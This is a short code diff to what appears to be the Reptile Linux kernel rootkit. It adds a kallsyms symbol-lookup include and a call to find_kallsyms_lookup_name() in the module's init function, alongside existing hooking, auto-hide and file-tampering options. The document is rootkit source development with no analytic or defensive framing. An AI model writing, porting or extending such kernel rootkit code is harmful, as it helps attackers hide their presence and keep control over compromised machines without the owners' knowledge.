@@ -4,6 +4,7 @@
 #include "khook/engine.c"
 #include "config.h"
 #include "util.h"
+#include "lookup.h"
 
 #ifdef CONFIG_AUTO_HIDE
 #	include "module.h"
@@ -434,6 +435,8 @@ out:
 static int __init reptile_init(void)
 {
 	int ret;
+
+	find_kallsyms_lookup_name();
 
 #ifdef CONFIG_FILE_TAMPERING
 	/* Unfortunately I need to use this to ensure in some kernel
